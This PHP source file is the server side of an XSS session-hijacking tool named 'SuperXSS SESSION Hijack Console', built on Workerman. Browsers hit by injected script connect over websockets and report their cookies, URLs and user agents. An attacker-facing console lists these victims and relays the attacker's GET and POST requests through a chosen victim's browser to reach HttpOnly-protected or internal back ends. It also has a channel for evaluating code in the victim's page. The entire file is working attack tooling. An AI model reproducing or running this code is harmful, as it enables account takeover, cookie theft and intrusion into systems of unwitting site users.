<?php
use Workerman\Worker;
use \Workerman\WebServer;
use \Workerman\Lib\Timer;

require_once __DIR__ . '/Workerman/Autoloader.php';
require_once __DIR__ . '/GlobalData/Server.php';
require_once __DIR__ . '/Function.php';
$Config = require_once __DIR__ . '/Config.php';


// 证书最好是申请的证书
$context = array(
    // 更多ssl选项请参考手册 http://php.net/manual/zh/context.ssl.php
    'ssl' => array(
        // 请使用绝对路径
        'local_cert'                 => '/etc/nginx/ssl/xxx.com_chain.crt', // 也可以是crt文件
        'local_pk'                   => '/etc/nginx/ssl/xxx.com_key.key',
        'verify_peer'                => false,
        // 'allow_self_signed' => true, //如果是自签名证书需要开启此选项
    )
);

$Hijack_console_worker = new Worker($Config['HIJACK_CONSOLE_LISTEN'], $context);
$WS_listen_worker = new Worker($Config['WS_LISTEN'], $context);
$GlobalData_Worker = new GlobalData\Server('127.0.0.1', 22018);

$Hijack_console_worker -> count = $Config['CONSOLE_WORKER_COUNT'];
$WS_listen_worker -> count = $Config['WS_WORKER_COUNT'];

$Hijack_console_worker->transport = 'ssl';
$WS_listen_worker->transport = 'ssl';

//status: 0 已发送给ws 1 ws已经确认收到请求 2 已收到ws返回结果包

$WS_listen_worker -> onWorkerStart = function(){
	global $GD_Client;
	$GD_Client = new \GlobalData\Client('127.0.0.1:22018');
	$GD_Client -> sessionlist = array();
	$GD_Client -> reply_pool = array();
	$GD_Client -> eval_pool = array();
	$GD_Client -> send_pool = array();
	$GD_Client -> reply_pool_lock = false;
};

$Hijack_console_worker -> onWorkerStart = function(){
	global $GD_Client;
	$GD_Client = new \GlobalData\Client('127.0.0.1:22018');
};

$WS_listen_worker -> onConnect = function($connection){
	//4s未发送ping包关闭连接
	$connection -> auth_timer_id = Timer::add(4, function()use($connection){
		$connection -> close();
	}, null, false);
	
	$connection -> send_timer = Timer::add(0.1, function()use($connection){
		global $GD_Client;
		$send_pool = $GD_Client -> send_pool;
		$unsetlist = array();
		foreach($send_pool as $k => $v){
			if($v['SESSIONID'] == $connection -> sessionid){
				$connection -> send($v['BODY']);
				$unsetlist[] = $k;
			}
		}
		foreach($unsetlist as $v){
			unset($send_pool[$v]);
		}
		$GD_Client -> send_pool = $send_pool;
	});

	
	$connection -> autojob_timer = Timer::add(5, function()use($connection){
		global $GD_Client;
		while(true){
			if(!$GD_Client -> reply_pool_lock){
				$GD_Client -> reply_pool_lock = true;
				break;
			}else{
				usleep(1000);
			}
		}
		$reply_pool = $GD_Client -> reply_pool;
		foreach($reply_pool as $k => $v){
			if((time() - $v['ADD_TIME'] >= 8 && $v['STATUS'] == 0) || (time() - $v['ADD_TIME'] >= 20 && $v['STATUS'] == 1)){
				$reply_pool[$k]['STATUS'] = 2;
				$reply_pool[$k]['STATUS_CODE'] = 504;
				$reply_pool[$k]['CT'] = "text/html";
				$reply_pool[$k]['CONTENT'] = "Client failed to reply within time limit";
			}
		}
		$GD_Client -> reply_pool = $reply_pool;
		$eval_pool = $GD_Client -> eval_pool;
		foreach($eval_pool as $k => $v){
			if((time() - $v['ADD_TIME'] >= 8 && $v['STATUS'] == 0) || (time() - $v['ADD_TIME'] >= 20 && $v['STATUS'] == 1)){
				$eval_pool[$k]['STATUS'] = 2;
				$eval_pool[$k]['CONTENT'] = "";
			}
		}
		$GD_Client -> eval_pool = $eval_pool;
		$GD_Client -> reply_pool_lock = false;
    });
};

$WS_listen_worker -> onClose = function($connection){
	global $GD_Client;
	while(true){
		if(!$GD_Client -> reply_pool_lock){
			$GD_Client -> reply_pool_lock = true;
			break;
		}else{
			usleep(5000);
		}
	}
	$sessionlist = $GD_Client -> sessionlist;
	$eval_pool = $GD_Client -> eval_pool;
	$reply_pool = $GD_Client -> reply_pool;

	if(isset($connection -> sessionid) && isset($sessionlist[$connection -> sessionid])){
		unset($sessionlist[$connection -> sessionid]);
	}
	for($i = 0; $i < count($reply_pool); $i++){
		if($reply_pool[$i]['SESSIONID'] === $connection -> sessionid && $reply_pool[$i]['STATUS'] != 2){
			$reply_pool[$i]['STATUS'] = 2;
			$reply_pool[$i]['STATUS_CODE'] = 503;
			$reply_pool[$i]['CT'] = "text/html";
			$reply_pool[$i]['CONTENT'] = "Client closed the websocket connection";
		}
	}
	for($i = 0; $i < count($eval_pool); $i++){
		if($eval_pool[$i]['SESSIONID'] === $connection -> sessionid && $eval_pool[$i]['STATUS'] != 2){
			$eval_pool[$i]['STATUS'] = 2;
			$eval_pool[$i]['CONTENT'] = "";
		}
	}
	
	$GD_Client -> sessionlist = $sessionlist;
	$GD_Client -> reply_pool = $reply_pool;
	$GD_Client -> eval_pool = $eval_pool;
	$GD_Client -> reply_pool_lock = false;
};

$WS_listen_worker -> onMessage = function($connection, $data){
	global $GD_Client;
	//确认数据包
	if(!$data = json_decode($data, true)){
		$connection -> close();
	}elseif(!isset($data['OP'])){
		$connection -> close();
	}
	
	switch($data['OP']){
		case "init":
			if(isset($data['UA']) && isset($data['REFERER']) && isset($data['URL']) && isset($data['BASEURL']) && isset($data['COOKIE']) && !isset($connection -> sessionid)){
				$res['INITSTATUS'] = 1;
				$connection -> sessionid = randChar(20);
				$sessionlist = $GD_Client -> sessionlist;
				$sessionlist[$connection -> sessionid] = array("LastPing" => time(),
																"IP" => $connection -> getRemoteIp(),
																"UA" => htmlspecialchars(base64_decode($data['UA'])),
																"URL" => htmlspecialchars(base64_decode($data['URL'])),
																"REFERER" => htmlspecialchars(base64_decode($data['REFERER'])),
																"BASEURL" => htmlspecialchars(base64_decode($data['BASEURL'])),
																"COOKIE" => htmlspecialchars(base64_decode($data['COOKIE'])));
				$GD_Client -> sessionlist = $sessionlist;
				Timer::del($connection -> auth_timer_id);
				//一旦12s没有提交心跳包则关闭连接
				$connection -> auth_timer_id = Timer::add(12, function()use($connection){
					$connection->close();
				}, null, false);
				$connection -> send(json_encode($res));
			}else{
				$connection -> close();
			}
		break;
		case "ping":
			$res['PINGSTATUS'] = 1;
			$sessionlist = $GD_Client -> sessionlist;
			if(!isset($connection -> sessionid) || !isset($sessionlist[$connection -> sessionid])){
				$connection -> close();
			}
			$sessionlist[$connection -> sessionid]["LastPing"] = time();
			$GD_Client -> sessionlist = $sessionlist;
			//reset timer
			Timer::del($connection -> auth_timer_id);
			$connection -> auth_timer_id = Timer::add(12, function()use($connection){
				$connection->close();
			}, null, false);
			$connection -> send(json_encode($res));
		break;
		case "pushxhr":
			while(true){
				if(!$GD_Client -> reply_pool_lock){
					$GD_Client -> reply_pool_lock = true;
					break;
				}else{
					usleep(5000);
				}
			}
			$sessionlist = $GD_Client -> sessionlist;
			$reply_pool = $GD_Client -> reply_pool;
			if(!isset($connection -> sessionid) || !isset($sessionlist[$connection -> sessionid])){
				$connection -> close();
			}
			if(isset($data['STATUS_CODE']) && is_numeric($data['STATUS_CODE']) && isset($data['JOBID']) && isset($data['CT']) && isset($data['CONTENT'])){
				if($data['STATUS_CODE'] > 999){
					$connection -> close();
				}
				if(isset($reply_pool[$data['JOBID']]) && $reply_pool[$data['JOBID']]['STATUS'] == 1){
					$res['STATUS'] = 1;
					$res['JOBID'] = $data['JOBID'];
					$reply_pool[$data['JOBID']]['STATUS_CODE'] = intval($data['STATUS_CODE']);
					$reply_pool[$data['JOBID']]['CT'] = $data['CT'];
					$reply_pool[$data['JOBID']]['CONTENT'] = hex2bin($data['CONTENT']);
					$reply_pool[$data['JOBID']]['STATUS'] = 2;
				}else{
					$res['STATUS'] = 0;
					$res['JOBID'] = $data['JOBID'];
				}
				$GD_Client -> reply_pool = $reply_pool;
				$GD_Client -> reply_pool_lock = false;
				$connection -> send(json_encode($res));
			}else{
				$GD_Client -> reply_pool_lock = false;
				$connection -> close();
			}
		break;
		case "confirmxhr":
			while(true){
				if(!$GD_Client -> reply_pool_lock){
					$GD_Client -> reply_pool_lock = true;
					break;
				}else{
					usleep(5000);
				}
			}
			$sessionlist = $GD_Client -> sessionlist;
			$reply_pool = $GD_Client -> reply_pool;
			if(!isset($connection -> sessionid) || !isset($sessionlist[$connection -> sessionid])){
				$GD_Client -> reply_pool_lock = false;
				$connection -> close();
			}
			if(isset($data['JOBID']) && isset($reply_pool[$data['JOBID']]) && $reply_pool[$data['JOBID']]['STATUS'] == 0){
				$reply_pool[$data['JOBID']]['STATUS'] = 1;
				$res['STATUS'] = 1;
				$res['JOBID'] = $data['JOBID'];
			}else{
				$res['STATUS'] = 0;
				$res['JOBID'] = $data['JOBID'];
			}
			$GD_Client -> reply_pool = $reply_pool;
			$GD_Client -> reply_pool_lock = false;
			$connection -> send(json_encode($res));
		break;
		case "confirmeval":
			$sessionlist = $GD_Client -> sessionlist;
			$eval_pool = $GD_Client -> eval_pool;
			if(!isset($connection -> sessionid) || !isset($sessionlist[$connection -> sessionid])){
				$connection -> close();
			}
			if(isset($data['JOBID']) && isset($eval_pool[$data['JOBID']]) && $eval_pool[$data['JOBID']]['STATUS'] == 0){
				$eval_pool[$data['JOBID']]['STATUS'] = 1;
				$res['STATUS'] = 1;
				$res['JOBID'] = $data['JOBID'];
			}else{
				$res['STATUS'] = 0;
				$res['JOBID'] = $data['JOBID'];
			}
			$GD_Client -> eval_pool = $eval_pool;
			$connection -> send(json_encode($res));
		break;
		case "pusheval":
			$sessionlist = $GD_Client -> sessionlist;
			$eval_pool = $GD_Client -> eval_pool;
			if(!isset($connection -> sessionid) || !isset($sessionlist[$connection -> sessionid])){
				$connection -> close();
			}
			if(isset($data['JOBID']) && isset($data['CONTENT'])){
				if(isset($eval_pool[$data['JOBID']]) && $eval_pool[$data['JOBID']]['STATUS'] == 1){
					$res['STATUS'] = 1;
					$res['JOBID'] = $data['JOBID'];
					$eval_pool[$data['JOBID']]['CONTENT'] = hex2bin($data['CONTENT']);
					$eval_pool[$data['JOBID']]['STATUS'] = 2;
				}else{
					$res['STATUS'] = 0;
					$res['JOBID'] = $data['JOBID'];
				}
				$GD_Client -> eval_pool = $eval_pool;
				$connection -> send(json_encode($res));
			}else{
				$connection -> close();
			}
		break;
	}
};

$Hijack_console_worker -> onMessage = function($connection, $data)use($Config){
	global $GD_Client;
	$sessionlist = $GD_Client -> sessionlist;
	$eval_pool = $GD_Client -> eval_pool;
	if(!isset($_COOKIE['hijack_session']) && !isset($_GET['hijack_session'])){
		$html = '<html><head><title>SuperXSS SESSION Hijack Console</title><link href="https://cdn.bootcss.com/bootstrap/4.0.0/css/bootstrap.min.css" rel="stylesheet"><script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script><script src="https://cdn.bootcss.com/bootstrap/4.0.0/js/bootstrap.min.js"></script><meta http-equiv="refresh" content="5"></head><body>';
		$html .= '<div class="container-fluid"><div class="row-fluid"><div class="span12"><h3 class="text-center">SuperXSS SESSION Hijack Console</h3>';

		$html .= '<div class="alert alert-dismissible alert-info"><h4 class="alert-heading"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">提示！</font></font></h4><p class="mb-0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">';
		$html .= '当X别人站的时候，遇到Httponly flag时，被x到的站位于内网无法直接访问时。你要的是一个基于网页套接字的客户端网页代理程序，客户端JS被注入之后会创建到指定服务端的网页套接字连接并接收命令进行XHR请求，从而使得无法直接访问的后台等可以通过客户端浏览器本身作为代理访问。';
		$html .= '</font></p></div><div class="row-fluid"><div class="span8">';
		$html .= '<table  class="table table-hover"><thead><tr><th>上次心跳包</th> <th>IP</th><th>URL</th> <th>User-Agent</th><th>Cookie</th> <th>Hijack</th></tr></thead>';
		foreach($sessionlist as $session => $info){
			$s = time() - $info['LastPing'];
			$html .= '<tbody><tr>';
			$html .= '<td>' . $s . '秒前</td>';
			$html .= '<td>'.$info['IP'].'</td>';
			$html .= '<td>'.$info['URL'].'</td>';
			$html .= '<td>'.$info['UA'].'</td>';
			$html .= '<td>hijack_session='. $session .'</td>';
			$html .= '<td><a href="/?hijack_session='. $session .'" class="text-decoration-none">Hijack this session</a></td>';
			$html .= '</tr></tbody>';
		}
/*		$html .= '</div><div class="span4">';
		foreach($sessionlist as $session => $info){
			$html .= '<a href="/?hijack_session='. $session .'" class="btn btn-success btn-large btn-block" type="button">Hijack this session</a>';
		}*/
		$html .= '</table></div></div></div></div></div>';
		$connection -> send($html);	
		//$connection -> send(var_export($_SERVER, true).var_export($_POST, true).var_export($_FILES, true));
	}elseif(isset($_GET['hijack_session'])){
		if(!isset($sessionlist[$_GET['hijack_session']])){
			Workerman\Protocols\Http::header('HTTP', true, 404);
			$connection -> send("Current Session not exists or no longer be able to use");
		}else{
			Workerman\Protocols\Http::setcookie('hijack_session', $_GET['hijack_session']);
			Workerman\Protocols\Http::header("Location: /");
			$connection -> send("Redirecting...");
		}
	}else{
		$currentsession = $_COOKIE['hijack_session'];
		if(!isset($sessionlist[$currentsession])){
			Workerman\Protocols\Http::header('HTTP', true, 404);
			$connection -> send("Current Session not exists or no longer be able to use");
		}else{
			$directend = false;
			while(true){
				if(!$GD_Client -> reply_pool_lock){
					$GD_Client -> reply_pool_lock = true;
					break;
				}else{
					usleep(5000);
				}
			}
			$reply_pool = $GD_Client -> reply_pool;
			$currentsession = $sessionlist[$currentsession];
			if($_SERVER['REQUEST_METHOD'] == 'GET'){
				$filesuffix = explode('?', $_SERVER['REQUEST_URI']);
				$filesuffix = explode('.', $filesuffix[0]);
				$filesuffix = $filesuffix[count($filesuffix) - 1];
				if(in_array($filesuffix, explode(',', $Config['IGNORE_SUFFIX']))){
					//静态文件302直接访问
					$realpath = $currentsession['BASEURL'] . $_SERVER['REQUEST_URI'];
					Workerman\Protocols\Http::header("Location: {$realpath}");
					$GD_Client -> reply_pool_lock = false;
					$directend = true;
					$connection -> send("Redirecting...");
				}else{
					$jobid = randChar(8) . time();
					$reply_pool[$jobid] = array('STATUS' => 0, 
												'SESSIONID' => $_COOKIE['hijack_session'],
												'ADD_TIME' => time()
												);
					
					$send = array("OP" => "GET",
									"URI" => $_SERVER['REQUEST_URI'],
									"JOBID" => $jobid);
					$GD_Client -> reply_pool = $reply_pool;
					$GD_Client -> reply_pool_lock = false;
					$send_pool = $GD_Client -> send_pool;
					$send_pool[] = array('SESSIONID' => $_COOKIE['hijack_session'], 'BODY' => json_encode($send));
					$GD_Client -> send_pool = $send_pool;
				}
			}elseif($_SERVER['REQUEST_METHOD'] == 'POST'){
				$jobid = randChar(8) . time();
				$reply_pool[$jobid] = array('STATUS' => 0, 
											'SESSIONID' => $_COOKIE['hijack_session'],
											'ADD_TIME' => time()
											);
				$GD_Client -> reply_pool = $reply_pool;
				$GD_Client -> reply_pool_lock = false;
				$send = array("OP" => "POST", 
								"URI" => $_SERVER['REQUEST_URI'], 
								"CT" => $_SERVER['HTTP_CONTENT_TYPE'], 
								"DATA" => bin2hex($GLOBALS['HTTP_RAW_POST_DATA']),
								"JOBID" => $jobid);
				$send_pool = $GD_Client -> send_pool;
				$send_pool[] = array('SESSIONID' => $_COOKIE['hijack_session'], 'BODY' => json_encode($send));
				$GD_Client -> send_pool = $send_pool;
			}else{
				$GD_Client -> reply_pool_lock = false;
			}
			if(!$directend){
				while(true){
					while(true){
						if(!$GD_Client -> reply_pool_lock){
							$GD_Client -> reply_pool_lock = true;
							break;
						}else{
							usleep(1000);
						}
					}
					$reply_pool = $GD_Client -> reply_pool;
					if(!isset($reply_pool[$jobid])){
						echo $jobid."\n";
						$GD_Client -> reply_pool_lock = false;
						Workerman\Protocols\Http::header('HTTP', true, 500);
						$connection -> send("Server has experienced an exception");
						break;
					}else{
						if($reply_pool[$jobid]['STATUS'] == 2){
							Workerman\Protocols\Http::header('HTTP', true, $reply_pool[$jobid]['STATUS_CODE']);
							Workerman\Protocols\Http::header('Content-Type: ' . $reply_pool[$jobid]['CT']);
							$content = $reply_pool[$jobid]['CONTENT'];
							unset($reply_pool[$jobid]);
							if($Config['DOMAIN_AUTO_REPLACE'] == true){
								$content = str_replace('https:', '', str_replace('http:', '', str_replace(str_replace('https://','',str_replace('http://','',$currentsession['BASEURL'])), str_replace('https://','',str_replace('http://','',$Config['REPLACE_ADDR'])), $content)));
							}

							$GD_Client -> reply_pool = $reply_pool;
							$GD_Client -> reply_pool_lock = false;
							$connection -> send($content);
							break;
						}else{
							$GD_Client -> reply_pool_lock = false;
							usleep(100000);	//等待100ms
						}
					}
				}
			}
		}
	}
};

Worker::runAll();
